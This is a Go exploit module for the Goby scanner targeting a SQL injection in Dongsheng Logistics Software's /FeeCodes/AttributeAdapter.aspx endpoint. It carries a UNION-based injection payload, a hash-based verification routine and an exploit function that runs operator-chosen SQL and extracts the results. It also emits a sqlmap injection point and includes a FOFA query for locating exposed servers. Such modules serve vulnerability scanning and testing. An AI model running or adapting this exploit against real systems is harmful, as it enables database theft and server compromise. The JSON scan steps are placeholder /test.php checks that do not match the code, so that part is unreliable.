package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"math/rand"
	"net/url"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Dongsheng Logistics Software /FeeCodes/AttributeAdapter.aspx SQL Injection Vulnerability",
    "Description": "<p>Dongsheng Logistics Software is a logistics management software developed by Qingdao Dongsheng Weiye Software Co., Ltd., which integrates multiple functions such as order management, warehouse management, and transportation management. The company was founded in November 2004 (formerly Qingdao Jinghong Logistics Information Technology Co., Ltd.), focusing on products and services related to shipping logistics. The freight forwarding version of Dongsheng Logistics Information Management System adopts MS-SQLserver large database, combined with B/S+C/S program architecture, with simple, strict, flexible process and powerful functions. It has a good reputation and wide coverage.</p>",
    "Product": "Dongsheng Logistics Software",
    "Homepage": "http://www.dongshengsoft.com/",
    "DisclosureDate": "2024-11-06",
    "PostTime": "2024-11-06",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"dongshengsoft\" && title=\"登录\" || body=\"theme/dhtmlxcombo.css\"",
    "GobyQuery": "body=\"dongshengsoft\" && title=\"登录\" || body=\"theme/dhtmlxcombo.css\"",
    "Level": "1",
    "Impact": "<p>In addition to exploiting SQL injection vulnerabilities to obtain information from the database (for example, the administrator's backend password and site user personal information), attackers can even write passwords to the server with high permissions to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. Deploy a Web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/143560858?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "user",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "东胜物流软件 /FeeCodes/AttributeAdapter.aspx SQL 注入漏洞",
            "Product": "东胜物流软件",
            "Description": "<p>东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。该公司初创于2004年11月（前身为青岛景宏物流信息技术有限公司），专注于航运物流相关环节的产品和服务。东胜物流信息管理系统货代版采用MS-SQLserver大型数据库，结合B/S+C/S的程序架构，流程简捷、严密、灵活，功能强大。具有良好的口碑和广泛的覆盖率。<br></p>",
            "Recommendation": "<p>1、部署Web应⽤防⽕墙，对数据库操作进⾏监控。<br></p><p>2、如⾮必要，禁⽌公⽹访问该系统。<br><br></p>",
            "Impact": "<p>攻击者除了可以利⽤ SQL 注⼊漏洞获取数据库中的信息（例如，管理员后台密码、站点的⽤户个⼈信息）之外，甚⾄在⾼权限的情况可向服务器中写⼊⽊⻢，进⼀步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dongsheng Logistics Software /FeeCodes/AttributeAdapter.aspx SQL Injection Vulnerability",
            "Product": "Dongsheng Logistics Software",
            "Description": "<p>Dongsheng Logistics Software is a logistics management software developed by Qingdao Dongsheng Weiye Software Co., Ltd., which integrates multiple functions such as order management, warehouse management, and transportation management. The company was founded in November 2004 (formerly Qingdao Jinghong Logistics Information Technology Co., Ltd.), focusing on products and services related to shipping logistics. The freight forwarding version of Dongsheng Logistics Information Management System adopts MS-SQLserver large database, combined with B/S+C/S program architecture, with simple, strict, flexible process and powerful functions. It has a good reputation and wide coverage.<br></p>",
            "Recommendation": "<p>1. Deploy a Web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to exploiting SQL injection vulnerabilities to obtain information from the database (for example, the administrator's backend password and site user personal information), attackers can even write passwords to the server with high permissions to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9971"
}`

	setSqlPayloadiMGtt9g2EY := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		defineHeader := map[string]string{}

		rawpayload := fmt.Sprintf("1' UNION ALL SELECT NULL,%s,NULL,NULL,NULL,NULL-- AbIx", sql)
		urlget := "/FeeCodes/AttributeAdapter.aspx?handle=attrinfo&attrid=" + url.QueryEscape(rawpayload)

		resp, err = setGetRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil || resp.StatusCode != 200 {
			return resp, "", errors.New("Fail")
		}
		//配置漏洞存在的路径
		vulurl = "/FeeCodes/AttributeAdapter.aspx"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			MD5Reslut := rand.Intn(99999)
			MD5ResultStr := fmt.Sprintf("%d", MD5Reslut)
			//将MD5Hash进行md5加密
			MD5Hash := md5.New()
			MD5Hash.Write([]byte(MD5ResultStr))
			hashBytes := MD5Hash.Sum(nil)
			// 将MD5哈希值转换为十六进制字符串，并取前16个字符
			content := hex.EncodeToString(hashBytes)[:16]

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := fmt.Sprintf("sys.fn_sqlvarbasetostr(HashBytes('MD5','%s'))", MD5ResultStr)

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `SQL Server`
			/*
				makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
					reRequest := regexp.MustCompile(RegularUrl)
					if !reRequest.MatchString(RegularContent) {
						return "", fmt.Errorf("can't match value")
					}
					getname := reRequest.FindStringSubmatch(RegularContent)
					return getname[1], nil
				}
			*/
			sendPayload := setSqlPayloadiMGtt9g2EY
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "GET /FeeCodes/AttributeAdapter.aspx?handle=attrinfo&attrid=1'* HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0)Firefox/129.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nConnection: close"
			// 3.配置正则语句，从响应包中提取出数据
			regular := `"name":"([^'"]+)","desp`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadiMGtt9g2EY
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" || attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
